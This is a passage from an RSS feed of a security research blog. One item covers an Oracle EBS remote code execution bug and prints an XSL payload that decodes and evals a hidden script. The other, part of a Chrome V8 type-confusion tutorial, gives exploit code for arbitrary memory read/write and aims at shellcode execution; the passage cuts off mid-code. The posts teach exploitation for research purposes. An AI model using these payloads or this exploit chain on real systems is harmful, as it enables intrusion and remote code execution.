class="hljs-string">&quot;http://&quot;</span>);urlbuf.append(request.getServerName()); <span class="hljs-comment">// [1]</span>urlbuf.append(<span class="hljs-string">&quot;:&quot;</span>).append(request.getServerPort()).append(URI.toString()); <span class="hljs-comment">// [2]</span>String xslURL = urlbuf.toString() + <span class="hljs-string">&quot;ieshostedsurvey.xsl&quot;</span>;URL stylesheetURL = <span class="hljs-keyword">new</span> URL(xslURL.toString()); <span class="hljs-comment">// [3]</span>XSLStylesheet sheet = <span class="hljs-keyword">new</span> XSLStylesheet(stylesheetURL,stylesheetURL); <span class="hljs-comment">// [4]</span>XSLProcessor xslt = <span class="hljs-keyword">new</span> XSLProcessor();xslt.processXSL(sheet, xmlDoc, ...); <span class="hljs-comment">//[5]</span>..&lt;/body&gt;&lt;/html&gt;</code></pre><p>Auth Bypass&#xB85C; &#xC811;&#xADFC;&#xB41C; <code>ieshostedsurvey.jsp</code>&#xC5D0;&#xB294; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xC785;&#xB825;&#xC73C;&#xB85C; XSL URL&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xD55C; &#xB2E4;&#xC74C;, &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xC6D0;&#xACA9; XSL&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB610; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>[1]</code>,<code>[2]</code>&#xC5D0;&#xC11C; <code>request.getServerName()</code>, <code>request.getServerPort()</code>&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC870;&#xC791; &#xAC00;&#xB2A5;&#xD55C; Host &#xD5E4;&#xB354;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xB370;, &#xC774; &#xAC12;&#xC744; &#xC2E0;&#xB8B0;&#xD574; <code>xslURL</code>&#xC744; &#xB9CC;&#xB4E4;&#xBA74; &#xC545;&#xC131; XSL&#xC744; &#xD638;&#xC2A4;&#xD305;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>[3]</code>,<code>[4]</code>,<code>[5]</code>&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xD574;&#xB2F9; &#xC6D0;&#xACA9; XSL&#xC744; &#xC989;&#xC2DC; &#xB85C;&#xB4DC;&#xD558;&#xACE0; XSLT &#xCC98;&#xB9AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. XSLT &#xC5D4;&#xC9C4;&#xC774; &#xD655;&#xC7A5; &#xD568;&#xC218;/&#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; RCE&#xB97C; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><strong>XSL &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8; (payload)</strong></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/1999/XSL/Transform&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:jsm</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:eng</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:str</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/java.lang.String&gt;&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&apos;[base64_encoded_payload]&apos;)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;js&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;str:new($bs)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;m&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;jsm:new()&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;e&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;jsm:getEngineByName($m, &apos;js&apos;)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;eng:eval($e, $js)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$code&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span></code></pre><p>&#xC704; XSL &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8;&#xB294; Base64&#xB85C; &#xC228;&#xAE34; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBCF5;&#xC6D0;&#xD558;&#xACE0;, <code>ScriptEngine</code>&#xC73C;&#xB85C; eval&#xD574; &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; JSP&#xAC00; Host&#xC640; Port&#xB97C; &#xC2E0;&#xB8B0;&#xD574; &#xB9CC;&#xB4E0; <code>xslURL</code>&#xB85C; &#xC774; &#xC6D0;&#xACA9; XSL &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xC21C;&#xAC04; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-61882">https://nvd.nist.gov/vuln/detail/CVE-2025-61882</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Oracle/">Oracle</category>
      
      <category domain="https://hackyboiz.github.io/tags/EBS/">EBS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CRLF/">CRLF</category>
      
      <category domain="https://hackyboiz.github.io/tags/SSRF/">SSRF</category>
      
      <category domain="https://hackyboiz.github.io/tags/XSLT/">XSLT</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/11/banda/CVE-2025-61882/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 4.(EN)</title>
      <link>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/</guid>
      <pubDate>Fri, 10 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, OUYA77 here!&lt;/p&gt;
&lt;p&gt;Last time I failed to manage the post length and stopped after obtaining only the Read/Write primitives; this </description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, OUYA77 here!</p><p>Last time I failed to manage the post length and stopped after obtaining only the Read/Write primitives; this time I&#x2019;ll go all the way to RCE. So in this post I&#x2019;ll cover the remaining exploit details from CVE-2018-17463 and talk about the Heap Sandbox.</p><blockquote><p>See previous posts<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 2.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 3.</a></p></blockquote><h2 id="0-Recap"><a href="#0-Recap" class="headerlink" title="0. Recap"></a>0. Recap</h2><p>In Part 3 we used type confusion to find overlapping property pairs. Because an object pointer was interpreted as a double, by reading/writing the double field we were able to obtain Read/Write primitives from the pointer value being corrupted.</p><ul><li>The addrOf Read Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-comment">// 1. Dynamically create the vuln function (bypass Map checks)</span>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // We expect p1 to be a Double, but the actual loaded value is</span><span class="hljs-string">      // an Object pointer (p2)</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// target object whose address we want to know</span>    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (expected type)</span>    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (actual loaded value)</span>    <span class="hljs-comment">// 2. Trigger JIT optimization and induce Type Confusion</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-comment">// If the return value is not 13.37 (i.e., an address leaked), success</span>        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// return address with tag removed</span>        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><ul><li>The fakeObj Write Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res;        }    }}</code></pre><p>Now that we have a read primitive that can leak addresses and a write primitive that can write to object addresses, we&#x2019;ll refine these into arbitrary memory read/write (AAR/AAW) primitives for the exploit and drive toward RCE.</p><h1 id="1-CVE-2018-17463-cont&#x2019;d-For-RCE"><a href="#1-CVE-2018-17463-cont&#x2019;d-For-RCE" class="headerlink" title="1. CVE-2018-17463 (cont&#x2019;d) - For RCE"></a>1. CVE-2018-17463 (cont&#x2019;d) - For RCE</h1><h2 id="1-1-Relative-R-W-&#x2192;-AAR-W"><a href="#1-1-Relative-R-W-&#x2192;-AAR-W" class="headerlink" title="1.1 Relative R/W &#x2192; AAR/W"></a>1.1 Relative R/W &#x2192; AAR/W</h2><h3 id="Concept"><a href="#Concept" class="headerlink" title="Concept)"></a>Concept)</h3><p>The current read/write primitives let us overwrite property values(pointers) inside other JavaScript objects, but that alone isn&#x2019;t useful for reading/writing arbitrary memory addresses directly.</p><p>The problem stems from <strong>how V8 manages objects</strong>. Even if we overwrite a memory slot with a value that looks like an address (e.g., <code>0x41414141</code>), V8 will still treat that value as a <strong>valid JavaScript object pointer</strong>. So if we write the address where we want to put shellcode into an object pointer slot, V8 will dereference that pointer expecting a real object layout and then try to access its internal fields (for example, the <code>backing store</code> pointer at offset 8). Because the memory at that address likely does not contain the expected object layout, V8 will crash or the manipulation will fail.</p><p>To get true arbitrary-address read/write(AAR/AAW) we must overwrite an <strong>internal field that V8 actually uses as a raw memory pointer</strong>, not a JavaScript object pointer. A commonly used target is the <code>backing_store</code> pointer of an <code>ArrayBuffer</code>. An <code>ArrayBuffer</code> represents a fixed-length block of binary data; one of its internal fields is a pointer to the actual memory that stores the bytes &#x2014; the <code>backing_store</code>.</p><p>Because typed arrays (<code>TypedArray</code>, <code>DataView</code>, etc.) read and write through that <code>backing_store</code> pointer, controlling it effectively gives us control of what memory a typed-view reads/writes. Crucially, V8 treats the <code>backing_store</code> as a raw buffer address rather than validating it as a JavaScript object pointer, so overwriting it lets us point an <code>ArrayBuffer</code> at arbitrary memory.</p><p>Note: you cannot directly read/write data from an <code>ArrayBuffer</code> without a view &#x2014; you must access it via a <code>TypedArray</code> or <code>DataView</code> using the desired format (float, 64-bit integer, etc.). The exploitation flow becomes: use the limited Relative R/W primitive to overwrite an <code>ArrayBuffer</code>&#x2018;s <code>backing_store</code> pointer, then use a <code>TypedArray/DataView</code> on that buffer to read/write arbitrary memory.</p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation)"></a>Exploitation)</h3><p>Let&#x2019;s see how to implement that concept with the <code>fakeObj</code> primitive we already used.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj}    ...</code></pre><p>With <code>fakeObj</code> we can overwrite certain inline properties that overlap with other objects&#x2019; inline fields. In the <code>vuln</code> function we attempt to write <code>p1.x</code>, but due to type confusion that write actually targets <code>p2</code>&#x2018;s inline slot. That allows us to overwrite an object&#x2019;s stored pointer value.</p><p>The diagrams below illustrate the overlap. The <code>ArrayBuffer</code> backing_store pointer sits at offset 32, so if we create an object with two inline properties (e.g., <code>x1</code> and <code>x2</code>) where <code>x2</code> overlaps that backing_store slot, we can use the <code>fakeObj</code> write to target the backing_store pointer.</p><p><img src="image.png" alt="ref: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)"></p><p>ref: <a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p>ArrayBuffer backing_store is at offset 32; by adding another inline property <code>x2</code> we can reach and overwrite that pointer via our primitive.</p><p><img src="image%201.png" alt="image.png"></p><p>Using one overwritten ArrayBuffer is useful, but repeatedly triggering the bug to change the backing_store each time you want to read/write many addresses is tedious. A more practical trick uses <strong>two ArrayBuffers</strong>:</p><ol><li>Corrupt the backing_store pointer of the first ArrayBuffer so it points to the second ArrayBuffer object.</li><li>Use a <code>TypedArray</code> view on the first buffer to write into a specific property index which, because we pointed it at the second buffer, will overwrite the second buffer&#x2019;s backing_store pointer.</li><li>Now the second buffer&#x2019;s backing_store points at an attacker-controlled address. Using a <code>TypedArray</code> view on the second buffer lets you read/write that memory directly.</li></ol><p>This two-buffer technique lets you rapidly read/write arbitrary heap addresses without retriggering the vulnerability for every access. Diagram showing the two-buffer trick:</p><p><img src="image%202.png" alt="image.png"></p><h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding)"></a>Coding)</h3><p>We previously hard-coded the overwritten value. Now we make the primitive accept a parameter for the new value, and we change <code>p1</code> to have <strong>two inline properties</strong>, because the second inline property overlaps with the ArrayBuffer <code>backing_store</code>. So the <code>vuln</code> function must write to the second inline property to overwrite the backing_store pointer.</p><p>Also add a <code>toNumber</code> helper to convert <code>BigInt</code> addresses into the floating representation used in the type-confused slot (because our type confusion returns a float, we need to convert addresses into float bit patterns).</p><p>Final <code>fakeObj</code> primitive:</p><pre><code class="hljs jsx">BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Write to Backing Store Pointer via Property x2</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Force Map Check and Redundancy Elimination</span>        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>}</code></pre><p>We must also update the <code>addrOf</code> primitive in the same way (use <code>x2</code>):</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Trigger our type-confusion by accessing an out-of-bound property</span><span class="hljs-string">      // This will load p1 from our object thinking it&apos;s a Double, but instead</span><span class="hljs-string">      // due to overlap, it will load p2 which is an Object</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    pValues[p1] = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-comment">// Subtract 1n from address due to pointer tagging.</span>            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><hr><p>Now that the exploit script is modified, we should be able to overwrite an ArrayBuffer&#x2019;s backing_store pointer. Let&#x2019;s test it: create a new 1024-byte ArrayBuffer, leak its address, then overwrite its backing_store with <code>0x41414141</code> and verify using <code>%DebugPrint</code> that the backing_store changed.</p><p>Append to the script:</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffer</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf1fAddr = addrOf(arrBuf1);print(<span class="hljs-string">`[+] ArrayBuffer Address: 0x<span class="hljs-subst">${arrBuf1fAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store Address...&quot;</span>)<span class="hljs-comment">// Overwrite Backing Store Pointer with 0x41414141</span><span class="hljs-keyword">let</span> ret = fakeObj(arrBuf1, <span class="hljs-number">0x41414141n</span>);print(<span class="hljs-string">`[+] Original Leaked Data: 0x<span class="hljs-subst">${ret.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)</code></pre><p>Example output:</p><pre><code class="hljs prolog">[+] <span class="hljs-symbol">Finding</span> <span class="hljs-symbol">Overlapping</span> <span class="hljs-symbol">Properties</span>...[+] <span class="hljs-symbol">Properties</span> p15 and p11 overlap![+] <span class="hljs-symbol">Leaking</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>: <span class="hljs-number">0x2a164919360</span>...[+] <span class="hljs-symbol">Corrupting</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Backing</span> <span class="hljs-symbol">Store</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">Original</span> <span class="hljs-symbol">Leaked</span> <span class="hljs-symbol">Data</span>: <span class="hljs-number">0x1aeda203210</span><span class="hljs-symbol">DebugPrint</span>: ... - backing_store: <span class="hljs-number">0000000041414141</span>...</code></pre><hr><p>Now that we can overwrite backing_store, use two ArrayBuffers to build AAR/AAW primitives:</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    }};</code></pre><p>Summary: using type confusion we first obtained relative R/W via overlapping properties; by corrupting <code>ArrayBuffer</code> backing_store and employing two buffers we convert that into arbitrary-address R/W. </p><p>Now let&#x2019;s run the code and get code execution!</p><h2 id="1-2-AAR-W-&#x2192;-RCE"><a href="#1-2-AAR-W-&#x2192;-RCE" class="headerlink" title="1.2 AAR/W &#x2192; RCE"></a>1.2 AAR/W &#x2192; RCE</h2><h3 id="Toward-Gaining-Code-Execution"><a href="#Toward-Gaining-Code-Execution" class="headerlink" title="Toward Gaining Code Execution"></a>Toward Gaining Code Execution</h3><p>Now that we have AAR/W, we need to execute code &#x2014; but unfortunately we can&#x2019;t just write shellcode into the V8 heap or an ArrayBuffer and run it, because DEP(Data Execution Prevention) is enabled. A common alternative is to target JIT memory.</p><p>When JavaScript code is JIT-compiled, the compiler writes machine instructions into memory pages that must be executed, so those pages are typically given RWX(Read-Write-Execute) permissions. An attacker can leak a pointer to a JIT-compiled function, overwrite the code at that address with shellcode, and then call the function to run the shellcode.</p><p><em>However</em>, since 2018 the V8 team added <code>write_protect_code_memory</code>. That protection flips JIT pages to RX (Read-Execute) at execution time and to RW(Read-Write) only when writing, so it&#x2019;s no longer feasible to treat JIT memory as permanently RWX. As with pwnable challenges, one workaround is to build a ROP(Return-Oriented Programming) chain: manipulate vtables, JIT function pointers, or the stack to achieve code execution. ROP construction is fairly involved, though, so instead we&#x2019;ll use a simpler and more reliable approach: <strong>WebAssembly(wasm)</strong>.</p><h3 id="WebAssembly-basics"><a href="#WebAssembly-basics" class="headerlink" title="WebAssembly basics"></a>WebAssembly basics</h3><p>WebAssembly is a binary format designed to run low-level code in the browser (often compiled from C/C++), and it interoperates with JavaScript.</p><p>V8 does not fully optimize wasm code immediately; it first uses a baseline compiler called <strong>Liftoff</strong> to produce machine code. Wasm also uses JIT memory, so machine code is placed in executable pages. Importantly, because of asm.js compatibility reasons, the write-protect flag for wasm was (at the time) typically disabled, which made wasm a very useful exploitation primitive.</p><p>When a wasm module is instantiated in V8, function calls go through a <strong>jump table</strong>. Each function slot in that table points to the actual machine code for the function (a <code>WasmCode</code> object). Those pointers reference executable memory, so an attacker who can overwrite them could hijack execution. (Back in 2018 the wasm jump table in the V8 heap was readable/writable/executable and thus easy to hijack &#x2014; modern V8 has hardened this, though &#x315C;.&#x315C;.)</p><h3 id="addrOf-function-re-building"><a href="#addrOf-function-re-building" class="headerlink" title="addrOf function re-building"></a>addrOf function re-building</h3><p>Using our read/write primitives we can leak the wasm instance object address and the RWX jump table pointer. However, the earlier <code>addrOf</code> primitive relied on overlapping properties (which can corrupt other functionality), so we need a safer approach.</p><p>We will build a new <code>addrOf</code> by adding an <strong>out-of-line property</strong> to an <code>ArrayBuffer</code>, referencing the target object there, and then reading the property storage metadata via our memory read primitive to leak the object pointer. This avoids overwriting inline object fields.</p><blockquote><p><strong>Why this works</strong>_<br><strong>**An <code>ArrayBuffer</code> manages raw bytes and, separately from inline properties, it has a </strong>property storage**(property backing store). If we assign an object to an out-of-line property (e.g., <code>arrBuf.leakMe = obj</code>), a pointer to the object is placed in that property storage. By using our arbitrary memory read primitive to inspect that property store&#x2019;s metadata, we can indirectly obtain the object pointer. In other words, we can leak an object&#x2019;s address without overwriting its fields.</p></blockquote><pre><code class="hljs jsx"><span 